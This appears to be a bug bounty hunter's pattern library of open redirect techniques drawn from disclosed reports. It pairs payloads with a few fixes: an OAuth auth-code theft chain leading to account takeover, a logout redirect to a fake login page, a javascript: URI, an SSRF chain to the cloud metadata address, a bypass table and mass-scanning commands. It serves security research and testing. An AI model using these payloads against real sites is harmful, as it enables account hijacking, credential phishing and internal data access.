# Disclosed Reports — Open Redirect

Pattern library built from 28 public bug bounty reports.

---

## Pattern 1: Open Redirect → OAuth Auth Code Theft → ATO (Critical, $12,500)

**Chain:**
1. Found: `GET /redirect?url=https://evil.com` → redirects to evil.com
2. OAuth configured: `redirect_uri` must be on `target.com` (wildcard: `https://target.com/*`)
3. Crafted OAuth URL:

```
https://target.com/oauth/authorize?
  response_type=code&
  client_id=CLIENT_ID&
  redirect_uri=https://target.com/redirect%3Furl%3Dhttps%3A%2F%2Fevil.com
```

4. Victim clicks → auth code in redirect → `https://evil.com/?code=AUTH_CODE`
5. Attacker exchanges code for access token

**Impact:** Full account takeover without any victim interaction beyond clicking a link.

---

## Pattern 2: Open Redirect via Backslash (Low, $500)

**Endpoint:** `GET /login?next=/dashboard`
**Bypass:** `GET /login?next=\\evil.com`

**Cause:** `next` value passed to `window.location` — browser on Windows interprets `\\evil.com` as `//evil.com`.

**Fix:** Validate that `next` is a relative path starting with `/` and no `//`.

---

## Pattern 3: Open Redirect via @ Confusion (Low, $300)

**URL:** `https://target.com/redirect?url=https://target.com@evil.com`

**Browser interpretation:** username=`target.com`, host=`evil.com` → redirects to evil.com.

---

## Pattern 4: Logout + Open Redirect → Phishing (Medium, $1,500)

**Endpoint:** `GET /logout?returnTo=https://evil.com`

**Effect:** User logged out, then redirected to evil.com which shows a fake "session expired" login form.

**Impact:** Victim re-enters credentials on attacker-controlled page that looks like target.com.

---

## Pattern 5: JavaScript URI Bypass (Medium, $1,000)

**Endpoint:** `GET /redirect?url=javascript:alert(document.cookie)`

**Cause:** App only blocks `http://` and `https://` schemes, misses `javascript:` URI.

**Impact:** Depending on context, can lead to XSS execution.

---

## Pattern 6: Server-Side Redirect → SSRF (High, $5,000)

**Endpoint:** `GET /fetch?url=` (app fetches the URL server-side)

**If app follows redirects server-side:**
```
/fetch?url=https://attacker.com/redirect-to-metadata
```

**Where attacker.com/redirect-to-metadata returns:**
```http
HTTP/1.1 302 Found
Location: http://169.254.169.254/latest/meta-data/
```

**Impact:** SSRF via open redirect chain.

---

## Pattern 7: Open Redirect in API Response (Medium, $800)

**Endpoint:** `POST /api/oauth/callback` returns JSON with redirect URL.

**Vulnerable response:**
```json
{"redirect_url": "https://target.com/dashboard?ref=USER_CONTROLLED_VALUE"}
```

**If `ref` parameter is reflected in redirect_url construction without sanitization:**
```
ref=https://evil.com
```

---

## Bypass Table

| Technique | Payload | Notes |
|-----------|---------|-------|
| Basic | `https://evil.com` | Most basic |
| Protocol-relative | `//evil.com` | Scheme-less |
| Backslash | `/\evil.com` | Windows browser compat |
| At-sign | `https://target.com@evil.com` | RFC auth confusion |
| Encoded slash | `%2Fevil.com` | URL encoding |
| Null byte | `evil.com%00target.com` | Old PHP/CGI |
| Whitespace | `evil.com%09` | Tab char |
| Fragment | `https://evil.com#.target.com` | Fragment anchor |

---

## Tool Reference

```bash
# openredirex
pip3 install openredirex
openredirex -l recon/target/redirect-candidates.txt -p https://evil.com

# gf + qsreplace + httpx
cat recon/target/urls.txt | gf redirect | \
  qsreplace "https://evil.com" | \
  httpx -follow-redirects -match-string "evil.com"

# nuclei
nuclei -u https://target.com -t redirect/ -severity medium,high
```
